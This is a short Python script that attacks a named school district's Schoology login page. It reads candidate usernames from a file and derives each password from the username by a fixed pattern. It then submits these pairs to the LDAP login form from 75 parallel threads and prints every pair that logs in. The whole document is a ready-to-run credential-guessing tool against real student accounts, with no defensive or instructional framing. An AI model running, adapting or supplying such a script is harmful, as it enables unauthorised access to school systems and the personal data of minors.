import requests
from bs4 import BeautifulSoup
import queue
from threading import Thread

q = queue.LifoQueue()

def populate_queue():
    file = open('success.txt','r')
    for line in file:
        q.put(line)

populate_queue()

def makeSoup(url):
    return BeautifulSoup(s.get(url,timeout=None).text,'html.parser')

def check_pair_from_queue():
    while not q.empty():
        line = q.get()
        username = line[:8]
        password = line[0:5].upper()+line[5:8]

        with requests.Session() as s:
            soup = BeautifulSoup(s.get('https://schoology.hsd.k12.or.us/login/ldap',timeout=None).text,'html.parser')
            hidden_values = soup.find_all("input",type="hidden")
            form_build_id = hidden_values[1]["value"]

            login = {'mail':username,               # username
                   'pass':password,                 # password
                   'school_nid':'72935507',         # school-specific number
                   'form_id':'s_user_login_form',   # type of form being posted
                   'form_build_id':form_build_id}   # unique id
            r = s.post("https://schoology.hsd.k12.or.us/login/ldap",data=login)

            if r.url.count('home')==1:
                print(username,password)
        q.task_done()

for i in range(75):
    t1 = Thread(target=check_pair_from_queue)
    t1.start()

q.join()

